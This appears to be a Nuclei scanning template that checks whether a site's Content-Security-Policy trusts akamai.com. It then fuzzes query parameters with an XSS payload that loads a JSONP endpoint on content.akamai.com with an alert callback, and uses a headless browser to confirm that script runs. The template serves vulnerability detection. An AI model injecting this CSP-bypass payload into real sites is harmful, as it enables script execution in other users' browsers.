flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - akamai_content_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: akamai_content_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - akamai.com
  method: GET
  path:
  - '{{BaseURL}}'
id: akamai-content-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - Akamai Content
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,akamai-content,vuln
